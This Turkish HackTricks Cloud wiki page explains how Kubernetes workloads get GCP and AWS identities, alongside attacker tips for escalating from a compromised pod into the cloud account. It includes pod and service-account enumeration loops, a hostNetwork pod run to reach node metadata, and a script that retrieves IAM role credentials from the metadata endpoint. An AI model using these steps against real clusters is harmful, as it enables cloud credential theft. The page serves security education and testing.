# Kubernetes Bulutlara Dönüş

{% hint style="success" %}
AWS Hacking öğrenin ve uygulayın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitimi GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

## GCP

Eğer GCP içinde bir k8s kümesi çalıştırıyorsanız, küme içinde çalışan bazı uygulamaların GCP'ye erişim sağlamasını isteyebilirsiniz. Bunun için genellikle 2 yaygın yol vardır:

### GCP-SA anahtarlarını sır olarak bağlama

Bir **kubernetes uygulamasına GCP'ye erişim** vermenin yaygın bir yolu şöyledir:

* Bir GCP Servis Hesabı oluşturun
* İstenen izinleri ona bağlayın
* Oluşturulan SA'nın bir json anahtarını indirin
* Oluşturulan pod içine bir sır olarak bağlayın
* GOOGLE\_APPLICATION\_CREDENTIALS ortam değişkenini, json dosyasının bulunduğu yola işaret edecek şekilde ayarlayın.

{% hint style="warning" %}
Bu nedenle, bir **saldırgan** olarak, bir pod içindeki bir konteyneri ele geçirirseniz, o **ortam değişkenini** ve GCP kimlik bilgileri içeren **json dosyalarını** kontrol etmelisiniz.
{% endhint %}

### GSA json'ını KSA sırrına bağlama

Bir GSA'ya bir GKE kümesinde erişim vermenin bir yolu şöyle bağlamaktır:

* Aşağıdaki komutu kullanarak GKE kümenizin aynı ad alanında bir Kubernetes servis hesabı oluşturun:
```bash
Copy codekubectl create serviceaccount <service-account-name>
```
* GKE kümesine erişim izni vermek istediğiniz GCP hizmet hesabının kimlik bilgilerini içeren bir Kubernetes Secret oluşturun. Bunu aşağıdaki örnekte gösterildiği gibi `gcloud` komut satırı aracılığıyla yapabilirsiniz:
```bash
Copy codegcloud iam service-accounts keys create <key-file-name>.json \
--iam-account <gcp-service-account-email>
kubectl create secret generic <secret-name> \
--from-file=key.json=<key-file-name>.json
```
* Aşağıdaki komutu kullanarak Kubernetes Secret'ı Kubernetes servis hesabına bağlayın:
```bash
Copy codekubectl annotate serviceaccount <service-account-name> \
iam.gke.io/gcp-service-account=<gcp-service-account-email>
```
{% hint style="warning" %}
**İkinci adımda**, **GSA'nın kimlik bilgileri KSA'nın sırrı olarak ayarlandı**. Sonra, **GKE kümesi içinden o sırrı okuyabiliyorsanız**, **o GCP hizmet hesabına yükseltebilirsiniz**.
{% endhint %}

### GKE İş Yükü Kimliği

İş Yükü Kimliği ile, bir [Kubernetes hizmet hesabını](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/) bir [Google hizmet hesabı](https://cloud.google.com/iam/docs/understanding-service-accounts) olarak hareket etmesi için yapılandırabiliriz. Kubernetes hizmet hesabı ile çalışan pod'lar, Google Cloud API'lerine erişirken otomatik olarak Google hizmet hesabı olarak kimlik doğrulaması yapacaktır.

Bu davranışı etkinleştirmek için **ilk adım serisi** şunları içerir: **GCP'de İş Yükü Kimliğini etkinleştirme** ([**adımlar**](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)) ve k8s'in taklit etmesini istediğiniz GCP SA'yı oluşturma.

* Yeni bir kümede **İş Yükü Kimliğini etkinleştirin**

{% code overflow="wrap" %}
```bash
gcloud container clusters update <cluster_name> \
--region=us-central1 \
--workload-pool=<project-id>.svc.id.goog
```
{% endcode %}

* **Yeni bir düğüm havuzu oluşturun/güncelleyin** (Otomatik pilot kümeleme bu işlemi gerektirmez)

{% code overflow="wrap" %}
```bash
# You could update instead of create
gcloud container node-pools create <nodepoolname> --cluster=<cluser_name> --workload-metadata=GKE_METADATA --region=us-central1
```
{% endcode %}

* K8s üzerinden **taklit etmek için GCP Hizmet Hesabı** oluşturun:

{% code overflow="wrap" %}
```bash
# Create SA called "gsa2ksa"
gcloud iam service-accounts create gsa2ksa --project=<project-id>

# Give "roles/iam.securityReviewer" role to the SA
gcloud projects add-iam-policy-binding <project-id> \
--member "serviceAccount:gsa2ksa@<project-id>.iam.gserviceaccount.com" \
--role "roles/iam.securityReviewer"
```
{% endcode %}

* **Küme** bağlanın ve kullanmak için **hizmet hesabı oluşturun**

{% code overflow="wrap" %}
```bash
# Get k8s creds
gcloud container clusters get-credentials <cluster_name> --region=us-central1

# Generate our testing namespace
kubectl create namespace testing

# Create the KSA
kubectl create serviceaccount ksa2gcp -n testing
```
{% endcode %}

* **GSA'yı KSA ile bağlayın** 

{% code overflow="wrap" %}
```bash
# Allow the KSA to access the GSA in GCP IAM
gcloud iam service-accounts add-iam-policy-binding gsa2ksa@<project-id.iam.gserviceaccount.com \
--role roles/iam.workloadIdentityUser \
--member "serviceAccount:<project-id>.svc.id.goog[<namespace>/ksa2gcp]"

# Indicate to K8s that the SA is able to impersonate the GSA
kubectl annotate serviceaccount ksa2gcp \
--namespace testing \
iam.gke.io/gcp-service-account=gsa2ksa@security-devbox.iam.gserviceaccount.com
```
{% endcode %}

* **KSA** ile bir **pod** çalıştırın ve **GSA'ya** erişimi kontrol edin:
```bash
# If using Autopilot remove the nodeSelector stuff!
echo "apiVersion: v1
kind: Pod
metadata:
name: workload-identity-test
namespace: <namespace>
spec:
containers:
- image: google/cloud-sdk:slim
name: workload-identity-test
command: ['sleep','infinity']
serviceAccountName: ksa2gcp
nodeSelector:
iam.gke.io/gke-metadata-server-enabled: 'true'" | kubectl apply -f-

# Get inside the pod
kubectl exec -it workload-identity-test \
--namespace testing \
-- /bin/bash

# Check you can access the GSA from insie the pod with
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email
gcloud auth list
```
Aşağıdaki komutu kimlik doğrulaması gerektiğinde kontrol edin:

{% code overflow="wrap" %}
```bash
gcloud auth activate-service-account --key-file=/var/run/secrets/google/service-account/key.json
```
{% endcode %}

{% hint style="warning" %}
K8s içinde bir saldırgan olarak, SA'ları aramalısınız **`iam.gke.io/gcp-service-account` açıklamasına** sahip olanlar, çünkü bu SA'nın GCP'de bir şeye erişebileceğini gösterir. Başka bir seçenek, kümedeki her KSA'yı kötüye kullanmaya çalışmak ve erişimi olup olmadığını kontrol etmektir.\
GCP'den her zaman ilginç olan, bağlamaları numaralandırmak ve **Kubernetes içinde SA'lara hangi erişimleri verdiğinizi bilmektir**.
{% endhint %}

Bu, **tüm pod** tanımlarının **üzerinden kolayca yinelemek** için bir betiktir:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "gcp-service-account"
echo ""
echo ""
done
done | grep -B 1 "gcp-service-account"
```
## AWS

### Kiam & Kube2IAM (Podlar için IAM rolü) <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Podlara IAM Rollerini vermenin (eskimiş) bir yolu, bir [**Kiam**](https://github.com/uswitch/kiam) veya bir [**Kube2IAM**](https://github.com/jtblin/kube2iam) **sunucusu** kullanmaktır. Temelde, kümenizde bir **daemonset** çalıştırmanız gerekecek ve bu daemonset, ihtiyacı olan podlara IAM rollerine erişim sağlayacak olan **bir tür ayrıcalıklı IAM rolü** olacaktır.

İlk olarak, **hangi rollerin ad alanı içinde erişilebilir olacağını yapılandırmanız** gerekmektedir ve bunu ad alanı nesnesi içinde bir açıklama ile yaparsınız:

{% code title="Kiam" %}
```yaml
kind: Namespace
metadata:
name: iam-example
annotations:
iam.amazonaws.com/permitted: ".*"
```
{% endcode %}

{% code title="Kube2iam" %}
```yaml
apiVersion: v1
kind: Namespace
metadata:
annotations:
iam.amazonaws.com/allowed-roles: |
["role-arn"]
name: default
```
{% endcode %}

Namespace yapılandırıldıktan sonra, Pod'ların sahip olabileceği IAM rollerini belirtebilirsiniz **her pod tanımında istediğiniz rolü belirtmek için şöyle bir şey kullanarak**:

{% code title="Kiam & Kube2iam" %}
```yaml
kind: Pod
metadata:
name: foo
namespace: external-id-example
annotations:
iam.amazonaws.com/role: reportingdb-reader
```
{% endcode %}

{% hint style="warning" %}
Saldırgan olarak, eğer pod'larda veya namespace'lerde veya çalışan bir kiam/kube2iam sunucusunda (muhtemelen kube-system içinde) **bu açıklamaları bulursanız**, zaten **pod'lar tarafından kullanılan her rolü** ve daha fazlasını taklit edebilirsiniz (AWS hesabına erişiminiz varsa rolleri numaralandırın).
{% endhint %}

#### IAM Rolü ile Pod Oluşturma

{% hint style="info" %}
Belirtilmesi gereken IAM rolü, kiam/kube2iam rolüyle aynı AWS hesabında olmalı ve o rolü erişebilmelidir.
{% endhint %}
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
annotations:
iam.amazonaws.com/role: transaction-metadata
name: alpine
namespace: eevee
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", "sleep 100000"]' | kubectl apply -f -
```
### IAM Rolü K8s Hizmet Hesapları için OIDC Üzerinden <a href="#workflow-of-iam-role-for-service-accounts" id="workflow-of-iam-role-for-service-accounts"></a>

Bu, **AWS tarafından önerilen yol**.

1. İlk olarak, [küme için bir OIDC sağlayıcı oluşturmanız gerekmektedir](https://docs.aws.amazon.com/eks/latest/userguide/enable-iam-roles-for-service-accounts.html).
2. Ardından, SA'nın gereksinim duyacağı izinlere sahip bir IAM rolü oluşturun.
3. IAM rolü ile SA arasında [güven ilişkisi oluşturun](https://docs.aws.amazon.com/eks/latest/userguide/associate-service-account-role.html) (veya rolü ad alanına ait tüm SA'lara erişim sağlayan ad alanları). _Güven ilişkisi genellikle OIDC sağlayıcı adını, ad alanı adını ve SA adını kontrol eder_.
4. Son olarak, **rolün ARN'sini belirten bir açıklama ile bir SA oluşturun**, ve bu SA ile çalışan pod'lar **rolün belirteci**ne **erişim sağlayacaktır**. **Belirteç** bir dosyanın içine **yazılır** ve yol **`AWS_WEB_IDENTITY_TOKEN_FILE`** içinde belirtilir (varsayılan: `/var/run/secrets/eks.amazonaws.com/serviceaccount/token`).
```bash
# Create a service account with a role
cat >my-service-account.yaml <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
name: my-service-account
namespace: default
annotations:
eks.amazonaws.com/role-arn: arn:aws:iam::318142138553:role/EKSOIDCTesting
EOF
kubectl apply -f my-service-account.yaml

# Add a role to an existent service account
kubectl annotate serviceaccount -n $namespace $service_account eks.amazonaws.com/role-arn=arn:aws:iam::$account_id:role/my-role
```
`/var/run/secrets/eks.amazonaws.com/serviceaccount/token` dosyasından **token** kullanarak aws almak için şunu çalıştırın:

{% code overflow="wrap" %}
```bash
aws sts assume-role-with-web-identity --role-arn arn:aws:iam::123456789098:role/EKSOIDCTesting --role-session-name something --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```
{% endcode %}

{% hint style="warning" %}
Saldırgan olarak, bir K8s kümesini numaralandırabilirseniz, **bu belirteçle hizmet hesaplarını kontrol edin** ve **AWS'e yükseltme yapın**. Bunu yapmak için, yalnızca IAM **özel hizmet hesaplarından birini kullanarak bir pod oluşturun/çalıştırın** ve belirteci çalın.

Ayrıca, bir pod içindeyseniz, **AWS\_ROLE\_ARN** ve **AWS\_WEB\_IDENTITY\_TOKEN** gibi çevresel değişkenleri kontrol edin.
{% endhint %}

{% hint style="danger" %}
Bazen bir rolün **Güven Politikası yanlış yapılandırılmış** olabilir ve beklenen hizmet hesabına AssumeRole erişimi vermek yerine, **tüm hizmet hesaplarına** erişim sağlayabilir. Bu nedenle, kontrol edilen bir hizmet hesabına bir belirteç yazabilme yeteneğine sahipseniz, role erişebilirsiniz.

Daha fazla bilgi için **aşağıdaki sayfayı kontrol edin**:
{% endhint %}

{% content-ref url="../aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

### Kümedeki IAM Rollerine Sahip Pod'ları ve Hizmet Hesaplarını Bulma

Bu, **tüm pod'ları ve sas tanımlarını** kolayca **gezmek** ve o **belirteci aramak** için bir betiktir:
```bash
for ns in `kubectl get namespaces -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
for pod in `kubectl get pods -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "Pod: $ns/$pod"
kubectl get pod "$pod" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
for sa in `kubectl get serviceaccounts -n "$ns" -o custom-columns=NAME:.metadata.name | grep -v NAME`; do
echo "SA: $ns/$sa"
kubectl get serviceaccount "$sa" -n "$ns" -o yaml | grep "amazonaws.com"
echo ""
echo ""
done
done | grep -B 1 "amazonaws.com"
```
### Node IAM Rolü

Önceki bölüm, IAM Rollerini podlarla nasıl çalacağınız hakkındaydı, ancak bir K8s kümesinin **Bir Düğümü** bulut içinde bir **örnek olacak**. Bu, Düğümün muhtemelen **çalabileceğiniz yeni bir IAM rolüne sahip olacağı anlamına gelir** (_genellikle bir K8s kümesinin tüm düğümlerinin aynı IAM rolüne sahip olacağını unutmayın, bu nedenle her düğümü kontrol etmeye değmeyebilir_).

Ancak, düğümden meta veri uç noktasına erişmek için önemli bir gereklilik vardır, düğümde olmanız gerekmektedir (ssh oturumu?) veya en azından aynı ağda olmanız gerekmektedir:
```bash
kubectl run NodeIAMStealer --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostNetwork": true, "containers":[{"name":"1","image":"alpine","stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent"}]}}'
```
### IAM Rol Token'unu Çalma

Daha önce **Podlara IAM Rollerini eklemenin** veya hatta **Node'a kaçarak ekli IAM Rolünü çalmanın** nasıl yapıldığını tartışmıştık.

Yeni kazandığınız **IAM rol kimlik bilgilerini çalmak** için aşağıdaki betiği kullanabilirsiniz:
```bash
IAM_ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || wget  http://169.254.169.254/latest/meta-data/iam/security-credentials/ -O - 2>/dev/null)
if [ "$IAM_ROLE_NAME" ]; then
echo "IAM Role discovered: $IAM_ROLE_NAME"
if ! echo "$IAM_ROLE_NAME" | grep -q "empty role"; then
echo "Credentials:"
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" 2>/dev/null || wget "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE_NAME" -O - 2>/dev/null
fi
fi
```
## Referanslar

* [https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
* [https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c](https://medium.com/zeotap-customer-intelligence-unleashed/gke-workload-identity-a-secure-way-for-gke-applications-to-access-gcp-services-f880f4e74e8c)
* [https://blogs.halodoc.io/iam-roles-for-service-accounts-2/](https://blogs.halodoc.io/iam-roles-for-service-accounts-2/)

{% hint style="success" %}
AWS Hacking'ini öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitimi AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'ini öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitimi GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* Hacking püf noktalarını paylaşarak PR'ler göndererek [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
